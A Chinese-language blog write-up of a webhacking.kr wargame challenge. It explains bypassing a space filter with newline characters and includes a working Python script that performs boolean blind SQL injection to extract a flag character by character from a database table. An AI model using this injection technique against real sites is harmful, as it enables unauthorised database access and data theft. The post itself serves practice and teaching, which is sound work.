---
title: webhacking.kr challenge 10
author: rk700
layout: post
categories:
  - writeup
tags:
  - webhacking.kr
  - sql
---

这道题其实和web-09非常像。

进入页面，发现有提示，知道了column和表的名字。然后试了下直接把参数`no`取为查询语句，发现还是很多过滤了，而且最后发现似乎返回值只见到了0和1，估计还是盲注。

过滤的地方，主要是空格有问题，但如果把空格换为换行符`%0a`就可以了。

然后还用昨天的思路，但一直跑不出来……最后搜了答案。相比我的，主要是这次`flag`有两个，用我昨天做web-09时的那种对应关系被固定了。而用`min`或`max`就可以用特定的那一个。

另一处是昨天直接检查字符`in()`，不区分大小写导致最后暴力了一把；而用`ord()`先得到ascii码再检查就可以区分大小写了。

代码如下，我先试了`min(flag)`，中了

{% highlight python %}
#!/usr/bin/env python2

import httplib

def makePayload(statement):
    return "/challenge/web/web-10/index.php?no=if((select%%0aord(substr(min(flag),%d,1))from%%0aprob13password)in(%d),1,2)" % (statement[0], (statement[1]))

def checkResponse(response):
    return response.find("<td>1</td>") != -1

def doAssert(conn, header, statement):
    conn.request("GET", makePayload(statement), "", header)
    response = conn.getresponse()
    content = response.read()

    return checkResponse(content)

if __name__ == "__main__":
    url = "webhacking.kr"
    header = {"cookie":"PHPSESSID=oaka47lr0m69a85ghgfeqinup4"}
    conn = httplib.HTTPConnection(url)
    result = []
    for idx in range(1,21):
        print "idx %d" % idx
        for code in range(33,127):
            if doAssert(conn, header, (idx, code)):
                print code
                result.append(chr(code))
                break
    print ''.join(result)
{% endhighlight %}
